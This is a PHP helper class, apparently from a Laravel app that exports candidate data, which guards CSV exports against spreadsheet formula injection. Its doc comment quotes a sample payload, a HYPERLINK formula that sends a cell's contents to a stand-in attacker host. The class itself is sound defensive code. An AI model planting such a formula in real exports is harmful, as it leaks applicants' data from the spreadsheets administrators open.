<?php

namespace App\Support;

/**
 * Escaping for anything written into a CSV an administrator will open.
 *
 * A spreadsheet treats a cell starting with =, +, -, @, tab or carriage return
 * as a formula. A candidate who puts `=HYPERLINK("http://evil/"&A1,"CV")` in
 * their motivation statement has written a formula that fires the moment an
 * administrator opens the export, with the row's contents attached to it.
 *
 * Quoting does not help: Excel parses the formula after unquoting. The only
 * reliable fix is to make the cell not start with a trigger character, which is
 * what a leading apostrophe does — it is consumed by the spreadsheet and the
 * text displays as typed.
 */
class CsvSafe
{
    /** The characters a spreadsheet reads as "this cell is code". */
    private const TRIGGERS = ['=', '+', '-', '@', "\t", "\r"];

    /** One cell. */
    public static function cell(mixed $value): string
    {
        if ($value === null || $value === false) {
            return '';
        }

        if ($value === true) {
            return 'Yes';
        }

        if ($value instanceof \DateTimeInterface) {
            return $value->format('Y-m-d H:i');
        }

        $text = (string) $value;

        // Newlines inside a cell are legal but make a file that is painful to
        // read and trivial to misparse in a naive importer.
        $text = str_replace(["\r\n", "\r", "\n"], ' ', $text);

        if ($text !== '' && in_array($text[0], self::TRIGGERS, true)) {
            return "'" . $text;
        }

        return $text;
    }

    /**
     * One row.
     *
     * @param  array<array-key, mixed>  $row
     * @return list<string>
     */
    public static function row(array $row): array
    {
        return array_map([self::class, 'cell'], array_values($row));
    }

    /**
     * The whole file, as a string ready for a download response.
     *
     * @param  list<string>  $headings
     * @param  iterable<array<array-key, mixed>>  $rows
     */
    public static function build(array $headings, iterable $rows): string
    {
        $handle = fopen('php://temp', 'r+');

        // Excel on Windows reads a BOM-less UTF-8 file as the system codepage,
        // which mangles every non-ASCII name in the export.
        fwrite($handle, "\xEF\xBB\xBF");

        fputcsv($handle, static::row($headings));

        foreach ($rows as $row) {
            fputcsv($handle, static::row($row));
        }

        rewind($handle);
        $csv = (string) stream_get_contents($handle);
        fclose($handle);

        return $csv;
    }

    /** A filename-safe slug for the download. */
    public static function filename(string $prefix): string
    {
        $slug = preg_replace('/[^a-z0-9]+/i', '-', $prefix) ?: 'export';

        return strtolower(trim($slug, '-')) . '-' . now()->format('Y-m-d-His') . '.csv';
    }
}
